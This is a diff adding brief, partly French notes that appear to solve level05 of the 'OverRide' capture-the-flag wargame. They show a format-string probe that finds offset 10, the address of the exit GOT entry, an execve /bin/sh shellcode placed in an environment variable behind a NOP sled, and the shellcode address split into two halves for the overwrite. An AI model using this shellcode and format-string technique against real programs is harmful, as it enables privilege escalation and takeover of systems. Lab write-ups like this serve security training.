@@ -1,0 +1,35 @@
+--------------------------------------------
+Code Source :
+
+--------------------------------------------
+
+Solution :
+
+
+
+
+
+level05@OverRide:~$ python -c'print("AAAA" + " %p" * 20)' > /tmp/test
+level05@OverRide:~$ cat /tmp/test | ./level05 
+aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 
+0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 
+
+
+offset : 10
+
+exit :
+(hexa) 080497e0 = 134518752 (decimal)
+
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+export PAYLOAD=$(python -c 'print("\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
+
+Adresse de SHellCode :
+0xffffd77c
+
+d77c = 55164
+ffff = 65535
+
+
+
